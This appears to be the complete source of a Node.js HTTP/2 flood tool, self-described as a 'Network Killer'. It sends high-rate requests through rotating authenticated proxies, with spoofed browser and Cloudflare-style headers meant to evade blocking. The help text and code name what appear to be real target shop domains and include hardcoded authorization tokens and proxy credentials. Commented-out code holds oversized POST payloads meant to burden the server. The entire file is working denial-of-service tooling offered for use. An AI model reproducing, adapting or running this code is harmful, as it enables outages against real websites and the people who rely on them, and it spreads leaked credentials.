const tls = require('tls');
const http2 = require('http2');
const url = require('url');
const cluster = require('cluster');
const fs = require('fs');
const net = require("net");
const colors = require('colors');
const randstr = require('randomstring');

const EventEmitter = require('events')
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

process.on('uncaughtException', function (error) {
    //console.log(error)
});
process.on('unhandledRejection', function (error) {
    //console.log(error)
});

const ciphers = `ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305-SHA256:ECDHE-ECDSA-ECDHE-ECDSA-WITH-AES128-GCM-SHA256:ECDHE-ECDSA-ECDHE-RSA-WITH-AES128-GCM-SHA256:ECDHE-ECDSA-ECDHE-ECDSA-WITH-AES256-GCM-SHA384:ECDHE-ECDSA-ECDHE-RSA-WITH-AES256-GCM-SHA384:ECDHE-ECDSA-ECDHE-ECDSA-WITH-CHACHA20-POLY1305-SHA256:ECDHE-ECDSA-ECDHE-RSA-WITH-CHACHA20-POLY1305-SHA256:ECDHE-ECDSA-ECDHE-RSA-WITH-AES128-CBC-SHA:ECDHE-ECDSA-ECDHE-RSA-WITH-AES256-CBC-SHA:ECDHE-ECDSA-RSA-WITH-AES128-GCM-SHA256:ECDHE-ECDSA-RSA-WITH-AES256-GCM-SHA384:ECDHE-ECDSA-RSA-WITH-AES128-CBC-SHA:ECDHE-ECDSA-RSA-WITH-AES256-CBC-SHA`;
const sigalgs = `ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512`;
this.ecdhCurve = `GREASE:x25519:secp256r1:secp384r1`;
this.sigalgss = sigalgs;

function parseargs(args) {
    const parsedArgs = {};
    let currentFlag = null;

    for (const arg of args) {
        if (arg.startsWith('-')) {
            currentFlag = arg.slice(1);
            parsedArgs[currentFlag] = true;
        } else if (currentFlag) {
            parsedArgs[currentFlag] = arg;
            currentFlag = null;
        }
    }

    return parsedArgs;
}

const argv = parseargs(process.argv.slice(2));

// args body ----------
const urlT = argv['u'];
const timeT = argv['d'];
const threadsT = argv['t'];
const rateT = argv['r'];
const proxyT = argv['p'];

const intervalT = argv['i'];

const rateDelayT = parseInt(argv['rdelay']) || 0;

const delayT = parseInt(argv['delay']) || 1000;

const connectionsT = parseInt(argv['c']) || 1;

const methodT = argv['m'] || "GET";

const randpathT = argv['j'] || "";

const psizeT = parseInt(argv['psize']) || 16;

const authT = argv['auth'];

const logT = argv['log'];

const ignorestatuscodesT = argv['ignorestatus'] || "";

let parsedCodes;

try {
    parsedCodes = ignorestatuscodesT.split(",");
    parsedCodes = parsedCodes.map(code => parseInt(code, 10));
    if (!isNaN(parsedCodes)) {
        //
    } else {
        parsedCodes = [];
    }
} catch (e) {
    parsedCodes = [];
}

const helpT = argv['heroin'];
// args end ----------

if (helpT) {
    console.clear();
    console.log("H2FS | Network Killer (PATCH: 1.7) | @ardflood\n".brightGreen);
    console.log(
        `(*) Required arguments:\n` +
        ` -u : URL (ex: https://www.cloudflare.com)\n` +
        ` -d : Duration (ex: 60)\n` +
        ` -t : Threads (ex: 5)\n` +
        ` -r : Rate (ex: 64)\n` +
        ` -p : Proxy file (ex: proxy.txt)\n\n` +
        `(*) Optional arguments:\n` +
        ` -i : Interval flood (Default: false)\n` +
        ` -c : Connections (Default: 1)\n` +
        ` -j : Random path, 6 symbols (ex: /gitler + sdjhsdufso)\n` +
        ` -m : HTTP Method (Default: GET)\n\n` +
        `(*) Other arguments:\n` +
        ` -auth : Authorization header (ex: sdfjkhsdfiweghufy)\n` +
        ` -log : Enable logging (Default: false)\n\n` +
        `(*) Delay arguments:\n` +
        ` -delay : Interval delay. Works only with -i (Default: 1000)\n` +
        ` -rdelay : Rate delay. Can greatly slow down script (Default: 0)\n\n` +
        ` -heroin : Show help menu (exited)\n\n` +
        `(*) Examples:\n` +
        ` ./rapid -u https://zetvideo.net -d 30 -t 15 -r 80 -p proxy.txt\n` +
        ` ./rapid -u https://zetvideo.net -d 30 -t 15 -r 20 -p proxy.txt -c 5 -rdelay 1000 -cdelay 3000\n` +
        ` ./rapid -u https://zetvideo.net -d 30 -t 15 -r 64 -p proxy.txt -i -m POST -c 15\n`
    );
    process.exit(0);
}

if (methodT != "GET" && methodT != "POST") {
    console.log("Segmentation fault (core dumped)")
    process.exit(0);
}

const parsed = url.parse(urlT);

const log = (msg) => {
    const currentDate = new Date();
    const year = currentDate.getFullYear();
    const month = String(currentDate.getMonth() + 1).padStart(2, '0');
    const day = String(currentDate.getDate()).padStart(2, '0');
    const hours = String(currentDate.getHours()).padStart(2, '0');
    const minutes = String(currentDate.getMinutes()).padStart(2, '0');
    const seconds = String(currentDate.getSeconds()).padStart(2, '0');
    const formattedDate = `${year}/${month}/${day} ${hours}:${minutes}:${seconds}`;
    console.log(formattedDate, msg);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function ra(length) {
    const rsdat = randstr.generate({
        "charset": "0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
        "length": length
    });
    return rsdat;
}





class SocketMaster {
    constructor() { };

    HTTP(options, callback) {
        const socket = net.createConnection(options.port, options.host);

        socket.setTimeout(options.timeout * 600000);
        socket.setKeepAlive(true, 100000);

        socket.on('connect', () => {
            var proxyUsername, proxyPassword;

            var massive = ["KtAcveJF:iRBmuFgGFewZEqfW", "kyQGetKQ:vmHlCDIsSiXjhOpe"];
            var asdasd = randomElement(massive).split(":")


            socket.write(`CONNECT ${options.address}:443 HTTP/1.1\r\n`);
            socket.write(`Host: ${options.address}:443\r\n`);
            socket.write('Connection: close\r\n');
            socket.write('Proxy-Authorization: Basic ' + Buffer.from(asdasd[0] + ':' + asdasd[1]).toString('base64'))
            socket.write('\r\n\r\n');
        });

        socket.on('data', (data) => {
            const response = data.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200 OK") || response.includes("HTTP/1.0 200")
            if (!isAlive) {
                socket.destroy();
                return callback(undefined, "Error: Invalid response from proxy");
            }
            return callback(socket, undefined);
        });

        socket.on('timeout', () => {
            socket.destroy();
            return callback(undefined, "Error: Timeout exceeded");
        });

        socket.on('error', (err) => {
            // console.log(err)
            socket.destroy();
            return callback(undefined, "Error:", err);
        });
    }
}

const Socker = new SocketMaster();

const proxies = readLines(proxyT);

const wordBase = `way year work government day man world life part house course case system place end group company party information school fact money point example state business night area water thing family head hand order john side home development week power country council use service room market problem court lot a war police interest car law road form face education policy research sort office body person health mother question period name book level child control society minister view door line community south city god father centre effect staff position kind job woman action management act process north age evidence idea west support moment sense report mind church morning death change industry land care century range table back trade history study street committee rate word food language experience result team other sir section programme air authority role reason price town class nature subject department union bank member value need east practice type paper date decision figure right wife president university friend club quality voice lord stage king us situation light tax production march secretary art board may hospital month music cost field award issue bed project chapter girl game amount basis knowledge approach series love top news front future manager account computer security rest labour structure hair bill heart force attention`;
const parsedWords = wordBase.split(" ");

const base = {
    "100": "Continue",
    "101": "Switching Protocols",
    "200": "OK",
    "201": "Created",
    "202": "Accepted",
    "203": "Non-Authoritative Information",
    "204": "No Content",
    "205": "Reset Content",
    "206": "Partial Content",
    "300": "Multiple Choices",
    "301": "Moved Permanently",
    "302": "Found",
    "303": "See Other",
    "304": "Not Modified",
    "305": "Use Proxy",
    "307": "Temporary Redirect",
    "400": "Bad Request",
    "401": "Unauthorized",
    "402": "Payment Required",
    "403": "Forbidden",
    "404": "Not Found",
    "405": "Method Not Allowed",
    "406": "Not Acceptable",
    "407": "Proxy Authentication Required",
    "408": "Request Timeout",
    "409": "Conflict",
    "410": "Gone",
    "411": "Length Required",
    "412": "Precondition Failed",
    "413": "Payload Too Large",
    "414": "URI Too Long",
    "415": "Unsupported Media Type",
    "416": "Range Not Satisfiable",
    "417": "Expectation Failed",
    "429": "Too many requests",
    "500": "Internal Server Error",
    "501": "Not Implemented",
    "502": "Bad Gateway",
    "503": "Service Unavailable",
    "504": "Gateway Timeout",
    "505": "HTTP Version Not Supported",
    "520": "Web Server Error",
    "521": "Web Server Down",
    "522": "Connection Timed Out"
}

const domains = [
    "lavkasiadosti.umb.market",
    "drlizer.umb.market",
    "louisviton38.umb.market",
    "staffashirof.umb.market",
    "icegarden.umb.market",
];

const gandonsuka = [
    {
        postdata: {"data":{"section":"shop","type":"shipment","subtype":"categories","shop":"78fd2f6401258363ffd4ae5d3386af75","action":"get"},"action":"shops"},
        auth: "6f0c5da8d2bf705fc8c64ed41e9b1478154a2bbabbf6771e10183efaf5fb67ca",
        shop: "78fd2f6401258363ffd4ae5d3386af75"
    },
]

const runBenchmark = async () => {
    let proxyAddr = randomElement(proxies);

    const parsedProxy = proxyAddr.split(":");

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsed.host,
        timeout: 1000,
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return
        connection.setKeepAlive(true, 600000);

        const options = {
            host: parsed.host,
            rejectUnauthorized: false,
            ciphers: "ALL:!aPSK:!ECDSA+SHA1:!3DES",
            secure: true,
            ALPNProtocols: ['h2', 'http/1.1'],
            requestCert: true,
            servername: parsed.host,
            socket: connection,
            gzip: true,
            allowHTTP1: true,
            isServer: false,
        };


        const tlsConn = tls.connect(443, parsed.host, options);

        tlsConn.setKeepAlive(true, 60000);

        http2.connect(urlT, {
            settgs: {  // settings / settgs  ( idk how it works , but it wor ks) )00
                headerTableSize: 65535,
                enablePush: false,
                maxConcurrentStreams: 1000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
            },
            maxSessionMemory: 333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        }, (client) => {
            client.setLocalWindowSize(15663105);

            const osloeb = randomElement(gandonsuka);

            const headers = {};

            var browserVersion = randomIntn(120, 122);
            var userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`

            // ----------------------------------------------------------------------------------------------------------

             headers[':method'] = methodT;
            headers[':authority'] = parsed.host;
            headers[':scheme'] = "https";
            if (randpathT) { headers[':path'] = parsed.path + ra(psizeT); } else { headers[':path'] = parsed.path }
            
            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
            headers["accept-encoding"] = "gzip, deflate, br";
            headers["accept-language"] = "ru-RU,ru;q=0.6";
            headers["cache-control"] = "max-age=0";
            headers["sec-ch-ua"] = `"Not A(Brand";v="99", "Brave";v="121", "Chromium";v="121"`;
            headers["sec-ch-ua-mobile"] = "?0";
            headers["sec-ch-ua-model"] = `""`;
            headers["sec-ch-ua-platform"] = `"Windows"`;
            headers["sec-ch-ua-platform-version"] = `"7.0.0"`;
            headers["sec-fetch-dest"] = "document";
            if (Math.random() < 0.5) { headers["sec-fetch-mode"] = "navigate"; }
            if (Math.random() < 0.5) { headers["sec-fetch-site"] = "none"; }
            if (Math.random() < 0.5) { headers["sec-fetch-user"] = "?1"; }
            headers["Sec-Gpc"] = "1";
            headers["Upgrade-Insecure-Requests"] = "1";
            headers["User-Agent"] = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36`;

            if (methodT === "POST") { headers['content-type'] = "application/json"; }

            headers['Authorization'] = "c6d6002ef9338ee65a364e137205db71ec01ed01964a87675d0613f1f4e1299c"//osloeb.auth;

            if (Math.random() < 0.5) { headers["cf-request-id"] = "static"; }
            if (Math.random() < 0.5) { headers["accept-cloudflare-encoding"] = "*/*"; }
            if (Math.random() < 0.5) { headers["cf-max-age"] = "0"; }
            if (Math.random() < 0.5) { headers["cf-ssl-protocol"] = "\"TLSv1.3\""; }
            if (Math.random() < 0.5) { headers["prefer-http2"] = "?1"; }
            if (Math.random() < 0.5) { headers["disable-http1"] = "?0"; }
            if (Math.random() < 0.5) { headers["switch-to-https"] = "document"; }
            if (Math.random() < 0.5) { headers["enforce-http2-frame"] = "headers"; }

        //  headers["origin"] = "https://umb.market";
          headers["referer"] = `https://${ra(5)}.umb.market/`;

           //  headers[':method'] = methodT;
           //  headers[':authority'] = parsed.host;
           //  headers[':scheme'] = "https";
           //  if (randpathT) { headers[':path'] = parsed.path + ra(psizeT); } else { headers[':path'] = parsed.path }
           //  headers['Authorization'] = osloeb.auth;
           //  headers["sec-ch-ua"] = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "Google Chrome";v="${browserVersion}"`;
           //  headers["sec-ch-ua-mobile"] = `?0`;
           //  headers["sec-ch-ua-platform"] = `"Windows"`;
           //  //headers["upgrade-insecure-requests"] = "1";
           //  headers["accept"] = (methodT === "POST") ? "application/json, text/plain, */*" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";;
           //  if (methodT === "POST") { headers['content-type'] = "application/json"; }
           //  headers["sec-fetch-site"] = "cross-site";
           //  headers["sec-fetch-mode"] = "cors";
           //  headers["sec-fetch-dest"] = "empty";
           //  //headers["sec-fetch-user"] = "?1";

           // // headers["sec-gpc"] = "1";

           //  //headers["Cache-Control"] = "no-cache";

           //  headers["accept-language"] = "ru-RU,ru;q=0.7";
           //  headers["accept-encoding"] = "gzip, deflate, br";
           //  headers["origin"] = "https://umb.market";
           //  headers["referer"] = "https://umb.market/";

           //  headers["user-agent"] = userAgent;

            // ----------------------------------------------------------------------------------------------------------

            let postdata;

            ////////////////////////////////////////////////// if ((parsed.host).includes("apishop.umbrella.day")) {
            //////////////////////////////////////////////////     postdata = { action: "getProduct", data: { domain: "pidor.umb.market", id: "1" } }; //{ action: "get", data: { domain: "pidor.umb.market" } };
            ////////////////////////////////////////////////// } else {
            //////////////////////////////////////////////////     postdata = { data: { type: "get" }, action: "home" };
            ////////////////////////////////////////////////// }

           // postdata = {
           //     data: {
           //         section: "shop",
           //         type: "shipment",
           //         subtype: "products",
           //         name: ra(54000),
           //         sub: 0,
           //         image: `https://${ra(500)}.com`,
           //         discount: "23112313",
           //         price: "21312321312",
           //         fine: "123123123",
           //         description: ra(50000),
           //         bonus: "1232132132",
           //         subproducts: [
           //             {
           //                 name: "",
           //                 discount: 0,
           //                 price: 0,
           //                 bonus: 0,
           //                 fine: 0,
           //                 sum: 0,
           //                 city: ""
           //             }
           //         ],
           //         shop: osloeb.shop,
           //         action: "create",
           //         21q2eted: []
           //     },
           //     action: "shops"
           // }

            postdata = {"data":{"section":"shop","type":"shipment","subtype":"categories","shop":"78fd2f6401258363ffd4ae5d3386af75","action":"get"},"action":"shops"}

            // ----------------------------------------------------------------------------------------------------------

            function SendRequest(rt) {
                var request;

                request = client.request(headers);
                client.on('connect', (settings) => {
                    client.setLocalWindowSize(15663105);
                });

                if (methodT === "POST") {
                    request.write(JSON.stringify(postdata));
                }

                request.on("response", (response) => {
                    const statusCode = response[':status'];
                    const statusDescription = base[statusCode] || "Unknown Status";

                    /*
                        This function checking for a ban.
                        If a proxy receives a response of 403/429 code, it will be 
                        considered banned and removed from the proxy array so that 
                        it will not be attacked in the future and will not be killed 
                        completely.
                    */

                    /* Just logging status code from "base". */
                    if (logT) { log(`${statusCode} ${statusDescription}`); };

                    if (statusCode === 403 || statusCode === 429) {
                        //log(`${'!!!'.red} Ratelimited or banned: ${statusCode} ${statusDescription} (${proxyAddr})`);
                        const indexToRemove = proxies.indexOf(proxyAddr);
                        if (indexToRemove !== -1) {
                            proxies.splice(indexToRemove, 1);
                        }
                        return
                    }
                });

                request.on('data', (data) => {
             //   console.log(data.toString());
                    if (data.toString().includes('Cloudflare')) { return; }
                    if (data.toString().includes('https://performance.radar.cloudflare.com/beacon.js"')) { return; }
                    if (data.toString().includes('banned')) { return; }
                    if (data.toString().includes('loading')) { return; }
                })
                request.end();
                // request.close();

            }

            // ----------------------------------------------------------------------------------------------------------

            if (intervalT) {
                setInterval(() => {
                    for (let i = 0; i < rateT; i++) {
                        setTimeout(() => {
                            SendRequest(i);
                        }, rateDelayT)
                    }
                }, delayT)
            } else {
                for (let i = 0; i < rateT; i++) {
                    setTimeout(() => {
                        SendRequest(i);
                    }, rateDelayT)
                }
            }
        })
    })
}

if (cluster.isMaster) {
    console.log("H2FS | Network Killer (PATCH: 1.7) | Last update: 18.02.2024 | @ardflood".brightGreen);
    console.log("Parsed args:", argv);
    console.log("\n============================================\n")

    for (let i = 1; i <= threadsT; i++) {
        cluster.fork();
    }
} else {
    for (let i = 0; i < connectionsT; i++) {
        setInterval(() => {
            runBenchmark();
        });
    }
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, timeT * 1000);
